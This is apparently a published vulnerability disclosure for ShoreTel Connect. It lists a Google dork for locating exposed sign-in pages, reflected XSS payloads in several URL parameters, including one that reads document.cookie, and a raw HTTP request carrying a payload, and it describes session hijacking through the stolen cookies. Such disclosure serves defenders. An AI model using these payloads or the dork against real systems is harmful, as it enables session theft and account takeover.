@@ -1,0 +1,63 @@
+# Exploit Title: Shoretel Connect Multiple Vulnerability
+# Google Dork: inurl:/signin.php?ret=
+# Date: 14/06/2017
+# Author: Ramikan
+# Vendor Homepage: https://www.shoretel.com/
+# Software Link: https://www.shoretel.com/resource-center/shoretel-connect-onsite-overview
+# Version: Tested on 18.62.2000.0, 19.45.5101.0, 19.47.9000.0, 19.48.8400.0 can be affected on other versions.
+# Tested on: Mozila Firefox 53.0.3 (32 bit) Browser
+# CVE :CVE-2019-9591, CVE-2019-9592, CVE-2019-9593
+# Category:Web Apps
+
+
+Vulnerability: Reflected XSS and Session Fixation
+Vendor Web site: http://support.shoretel.com
+Version tested:18.62.2000.0, Version 19.45.1602.0, 19.45.5101.0, 19.47.9000.0, 19.48.8400.0
+Google dork: inurl:/signin.php?ret=
+Solution: Update to 19.49.1500.0
+
+
+
+Vulnerability 1:Refelected XSS & Form Action Hijacking
+
+Affected URL:
+
+/signin.php?ret=http%3A%2F%2Fdomainname.com%2F%3Fpage%3DACCOUNT&&brand=4429769&brandUrl=https://domainname.com/site/l8o5g--><script>alert(1)</script>y0gpy&page=ACCOUNT
+
+Affected Parameter: brandUrl
+
+
+Vulnerability 2: Reflected XSS
+
+Affected URL:
+
+/index.php/" onmouseover%3dalert(document.cookie) style%3dposition%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b
+
+Affected Parameter: url
+Affected Version 19.45.1602.0
+
+
+Vulnerability 3: Reflected XSS
+
+/site/?page=jtqv8"><script>alert(1)</script>bi14e
+
+Affected Parameter: page
+Affected Version:18.82.2000.0
+
+GET /site/?page=jtqv8"><script>alert(1)</script>bi14e HTTP/1.1
+Host: hostnamem
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://bdrsconference.bdrs.com/signin.php
+Cookie: PHPSESSID=2229e3450f16fcfb2531e2b9d01b9fec; chkcookie=1508247199505
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+Vulnerability 4: Session Hijacking
+
+By exploiting the above XSS vulnerability, the attacker can obtain the valid session cookies of a authenticated user and hijack the session.
+
+PHPSESSID, chkcookie both cookies are insecure.
